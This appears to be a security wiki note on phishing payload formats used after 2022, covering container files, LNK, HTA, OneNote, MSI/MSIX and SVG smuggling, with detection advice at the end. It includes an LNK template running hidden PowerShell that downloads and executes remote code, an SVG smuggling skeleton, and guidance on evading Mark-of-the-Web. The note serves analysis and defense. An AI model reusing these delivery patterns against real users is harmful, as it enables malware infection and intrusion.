---
title: Modern phishing payload formats post-VBA
slug: modern-phishing-payload-formats-post-vba
aliases: ["post-macro-phishing-formats","modern-initial-access-formats"]
date: 2026-06-08
---
{% raw %}

When Microsoft finally enforced the "block macros from the internet" policy in mid-2022, the entire commodity malware ecosystem had to retool inside a quarter. The result is the format zoo we still operate inside in 2026: container wrappers, scripting hosts that nobody patched, installer formats with signing stories, and image formats that smuggle script. This note is a tour of the live menu, what each one buys you against Mark-of-the-Web (MOTW) and AV, and where the detection has caught up.

See [[office-vba-macros-initial-access]] for the previous era and [[client-side-attacks-primer]] for the broader framing.

## The MOTW problem in one paragraph

MOTW is the `Zone.Identifier` alternate data stream Windows writes to anything downloaded from a browser or mail client. Office uses it to force Protected View and refuse macro execution; SmartScreen uses it to prompt; AMSI scanners weight it. The post-2022 game is almost entirely about format choices where the inner payload does not inherit the ADS when extracted, mounted, or unpacked. Everything below is a variation on that theme.

## Container wrappers: ISO, IMG, VHD, VHDX

Mounting an ISO or IMG via Explorer (which calls `tar.exe` / VHDMount under the hood) does not propagate the Zone.Identifier ADS to the contained files. So an LNK or HTA inside an `invoice.iso` runs without MOTW. This was the dominant Qakbot, IcedID, and Bumblebee delivery from late 2022 through 2023.

Microsoft eventually shipped the MOTW-on-mount fix (KB5022906 era, expanded through 2023). Modern Defender ASR rule "Block executable files unless they meet a prevalence, age, or trusted list criterion" catches a lot of this, and the Nov 2023 update finally taught ISO/IMG to carry MOTW into extracted children. VHD and VHDX took longer; some EDRs still treat them as benign disk images.

ITW: Bumblebee 2024 campaigns used `.vhd` precisely because IMG/ISO had been fixed. Pikabot in early 2025 shipped LNK-in-VHD.

## LNK in container

The actual execution primitive inside the container is almost always a `.lnk`. It calls `cmd.exe`, `powershell.exe`, `rundll32.exe`, or increasingly an LOLBin like `regsvr32.exe` with an HTTPS path or a sideloaded DLL. The LNK target string is your first detection: hunt for `mshta`, `wscript`, `forfiles`, `conhost --headless`, and long encoded `-EncodedCommand` blobs. See [[living-off-the-land]] and [[dll-side-loading]].

```
target: C:\Windows\System32\cmd.exe
args:   /c start /min powershell -w h -c "iex(iwr https://...)"
```

## HTA: still alive in 2026

`mshta.exe` runs JScript/VBScript in an IE-trident sandbox that nobody removed when IE itself was retired. HTAs do not trigger Office's macro block, AMSI coverage for legacy script engines is shallower than for PowerShell, and SmartScreen is the only gate. Delivered inside an ISO/VHD or via a `search-ms:` protocol handler, an HTA is a one-click run. Detail in [[jscript-hta-wsh-initial-access]].

## OneNote `.one` attachments

The 2023 OneNote wave exploited the fact that `.one` files are not gated like `.docm`, support embedded objects (FileAttachment), and rendered an enticing "Double click to view" overlay over the embedded HTA/CMD/BAT/WSF. Microsoft added FileAttachment-blocking by extension in OneNote 2306, which killed the easy path. Operators moved to embedded `.chm`, `.iso` links, and PDF-embedded OneNote. See [[onenote-and-modern-document-formats-payload-delivery]].

## MSI and Advanced Installer

Signed MSIs evade SmartScreen prompts and run with elevated context if the install logic asks for it. Advanced Installer's "custom action" feature became the Lumma/Vidar delivery vector in 2024: a legitimately signed installer wraps a malicious DLL or PowerShell custom action. Defender's "Block Win32 API calls from Office macros" ASR rule doesn't apply; you need the new "Block use of copied or impersonated system tools" rule plus signed-installer telemetry.

## MSIX, AppX, ClickOnce

MSIX gives you a code-signed, store-style package that installs per-user without admin and bypasses many AppLocker default rules (see [[applocker-bypass-techniques]]). The ms-appinstaller URI handler was abused enough in 2023 that Microsoft disabled it by default in early 2024, but signed `.msix` over HTTPS is still a viable delivery when the user double-clicks. Storm-0569 and Sangria Tempest leaned on this. Deep dive in [[msix-and-appx-as-malware-delivery]].

ClickOnce (`.application` manifests) is the 2025 favorite for credential-stealer crews because the trust dialog looks like a Windows-native prompt and the deployment URL can be any signed HTTPS endpoint.

## SVG smuggling

SVG is XML, and XML can carry a `<script>` block plus base64 payloads. The HTML smuggling pattern (see AiTM stack in [[aitm-evilginx-modern-phishing]]) moved into SVG because email gateways often inline-render SVG without scanning. The script reconstructs a ZIP or ISO client-side and triggers a download with a clean MOTW story because the bytes never traversed the gateway. Late 2024 saw broad use by Latrodectus and DarkGate.

```xml
<svg xmlns="https://www.w3.org/2000/svg">
  <script><![CDATA[
    const b64="UEsDBBQ...";
    const blob=new Blob([Uint8Array.from(atob(b64),c=>c.charCodeAt(0))]);
    /* trigger download */
  ]]></script>
</svg>
```

## Detection posture for 2026

- Enable all ASR rules in block mode; the "block executables from email" and "block unsigned processes from USB" rules cover most container exec.
- Audit `Zone.Identifier` propagation: hunt for child processes spawned from mounted volumes without ADS.
- Block `mshta.exe`, `wscript.exe`, `cscript.exe` via WDAC where business allows.
- Inspect SVG and HTML in mail at the gateway with a real JS parser, not regex.
- Treat signed MSI/MSIX as code, not data: certificate reputation feeds matter.

For offensive design choices and how this stack composes with C2, see [[osep-payload-development-toolkit]] and [[phishing-infrastructure-design]]. For the bypass-MOTW-via-extraction tricks at the archive layer, cross-reference [[wldp-bypass]] and [[applocker-bypass-techniques]].

{% endraw %}
